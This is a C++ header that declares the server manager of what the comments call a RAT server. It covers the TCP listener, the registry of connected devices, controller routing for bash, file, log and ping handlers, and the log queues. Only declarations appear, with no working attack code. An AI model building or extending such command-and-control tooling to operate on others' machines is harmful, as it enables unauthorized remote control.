#pragma once

#include "Utils/TCPSocket.hpp"
#include "ServerController.hpp"
#include "ServerCommandController.hpp"
#include "ServerLogController.hpp"
#include <memory>
#include <mutex>
#include <map>
#include <string>
#include <queue>
#include <vector>

namespace Server {

class ServerFileController;

/**
 * ServerManager - Central manager for RAT server operations
 * 
 * Responsibilities:
 * - TCP listener management and client connection acceptance
 * - Client lifecycle management (add/remove/query)
 * - Controller registry and routing
 * - Logging subsystem
 * - Response queue management for bash commands
 * - File handler registration for temporary file operations
 */
class ServerManager {
public:
    // ========================================================================
    // Singleton Pattern
    // ========================================================================
    static std::shared_ptr<ServerManager> getInstance();
    ServerManager(const ServerManager &) = delete;
    ServerManager &operator=(const ServerManager &) = delete;
    ~ServerManager();

    // ========================================================================
    // Server Lifecycle
    // ========================================================================
    bool start(unsigned short port);        // Initialize server and bind to port
    void stop();                            // Stop server and cleanup resources
    bool isRunning() const;                 // Check if server is currently running
    int run(unsigned short port);           // Main server loop (blocking)

    // ========================================================================
    // Client Management
    // ========================================================================
    bool addClient(const std::string &deviceName, std::unique_ptr<Utils::TCPSocket> socket);
    bool removeClient(const std::string &deviceName);
    Utils::TCPSocket *getClient(const std::string &deviceName);
    std::vector<std::string> listClients();
    std::string getClientIP(const std::string &name);
    bool hasClient(const std::string &name);

    // ========================================================================
    // Controller Access & Routing
    // ========================================================================
    IController *getController(const std::string &deviceName);
    ServerController *getServerController(const std::string &deviceName);
    IController *getControllerByHandle(const std::string &handle);
    IController *getSystemController(const std::string &handle);
    


    // ========================================================================
    // Logging Subsystem
    // ========================================================================
    void pushLog(const std::string &msg);
    bool popLog(std::string &out);
    const std::string &logPath() const { return logPath_; }

    // ========================================================================
    // Accessors
    // ========================================================================
    unsigned short port() const { return port_; }

private:
    ServerManager();

    // ========================================================================
    // Singleton Implementation
    // ========================================================================
    inline static std::shared_ptr<ServerManager> instance;
    inline static std::mutex initMutex;

    // ========================================================================
    // Server State
    // ========================================================================
    std::unique_ptr<Utils::TCPSocket> listener_;    // TCP listener socket
    unsigned short port_ = 0;                       // Bound port number
    bool running_ = false;                          // Server running flag
    mutable std::mutex mtx_;                        // Main state mutex

    // ========================================================================
    // Client Registry
    // ========================================================================
    std::map<std::string, std::unique_ptr<Utils::TCPSocket>> clients_;  // deviceName -> socket
    std::map<std::string, std::string> clientIPs_;                      // deviceName -> IP address
    
    // System controllers (log, bash, file, ping)
    std::map<std::string, std::unique_ptr<IController>> controllers_;   // handle -> controller
    
    // Per-client controllers (TCP communication per client)
    std::map<std::string, std::unique_ptr<ServerController>> clientControllers_;  // deviceName -> controller



    // ========================================================================
    // Logging System
    // ========================================================================
    std::queue<std::string> logs_;                  // Log message queue
    mutable std::mutex logMtx_;                     // Log queue mutex
    std::string logPath_;                           // Path to log file

    // ========================================================================
    // Helper Functions
    // ========================================================================
    void initializeControllers();                   // Initialize system controllers
    void cleanupResources();                        // Cleanup on shutdown
    std::string generateUniqueDeviceName(const std::string& base, int& counter);
    void handleNewClientConnection(std::unique_ptr<Utils::TCPSocket> client, int& unknownCount);
};

} 
